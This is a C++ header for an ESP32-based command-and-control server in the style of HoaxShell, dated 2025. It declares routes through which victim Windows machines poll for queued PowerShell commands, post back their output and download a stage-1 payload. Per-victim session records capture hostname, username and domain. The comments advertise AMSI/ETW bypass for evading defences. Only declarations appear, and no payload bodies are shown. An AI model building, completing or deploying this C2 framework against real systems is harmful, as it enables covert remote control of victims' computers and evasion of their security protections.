/**
 * @file hoaxshell_attack.h
 * @brief HoaxShell C2 Server Implementation for ESP32
 * 
 * Implements a lightweight Command & Control server compatible with
 * HoaxShell-style HTTP beaconing. Features:
 * 
 * - **Staged Payload Delivery**: Stage 0 stager → Stage 1 full payload
 * - **Session Management**: Tracks multiple victims by session ID
 * - **Command Queue**: Queue commands per-session for execution
 * - **Output Collection**: Receives and stores command results
 * - **AMSI/ETW Bypass**: Stage 1 includes modern evasion techniques
 * 
 * HTTP Routes:
 * - GET  /h/cmd  - Beacon endpoint (victim polls for commands)
 * - POST /h/out  - Output endpoint (victim posts results)
 * - GET  /h/s1   - Stage 1 payload download
 * 
 * @see https://github.com/t3l3machus/hoaxshell (Original Python version)
 * @author Monster S3 Team
 * @date 2025
 * @version 2.0
 */

#pragma once

#include <Arduino.h>
#include <ESPAsyncWebServer.h>
#include <vector>
#include <map>

/**
 * @struct HoaxSession
 * @brief Stores information about a connected victim session
 */
struct HoaxSession {
    String id;           ///< Unique session identifier
    String hostname;     ///< Victim computer name (from $env:COMPUTERNAME)
    String username;     ///< Victim username (from $env:USERNAME)
    String domain;       ///< Domain if joined
    uint32_t last_seen;  ///< Last beacon timestamp (millis)
    bool active;         ///< Session is still responding
};

class HoaxShellAttack {
public:
    HoaxShellAttack();
    
    /**
     * @brief Initialize the HoaxShell C2 server routes
     * @param server Pointer to the AsyncWebServer instance
     */
    void begin(AsyncWebServer* server);
    
    /**
     * @brief Generate the PowerShell payload script
     * @param ip The IP address of the ESP32 (attacker)
     * @return String containing the full PowerShell script
     */
    String generatePayload(String ip);
    
    /**
     * @brief Queue a command for a specific session
     * @param sessionId The target session ID
     * @param command The PowerShell command to run
     */
    void queueCommand(String sessionId, String command);
    
    /**
     * @brief Check if there is pending output to display
     * @return true if output buffer is not empty
     */
    bool hasOutput();
    
    /**
     * @brief Get and clear the latest output buffer
     * @return String containing the output
     */
    String getOutput();
    
    /**
     * @brief Get list of active sessions
     * @return JSON string of sessions
     */
    String getSessionsJson();
    
    // Internal handler for HTTP requests
    void _handleBeacon(AsyncWebServerRequest *request);
    void _handleCommand(AsyncWebServerRequest *request); // Note: Not used directly in current impl, kept for consistency
    
    /**
     * @brief Helper to generate Stage 1 payload (The actual heavy C2 logic)
     * @param ip The IP address of the ESP32
     */
    String _getStage1Payload(String ip);

private:
    // Command queue: SessionID -> List of commands
    std::map<String, std::vector<String>> command_queue;
    
    // Active sessions: SessionID -> SessionUtils
    std::map<String, HoaxSession> sessions;
    
    // Output buffer (shared for now, simple implementation)
    // In a full implementation, this should be per-session or streamed
    String output_buffer;
    
    // Config
    const char* HEADER_ID = "X-Session-ID";
    const char* HEADER_MSG = "X-Output"; // Not used in standard HoaxShell but useful context
};

extern HoaxShellAttack HoaxShell;
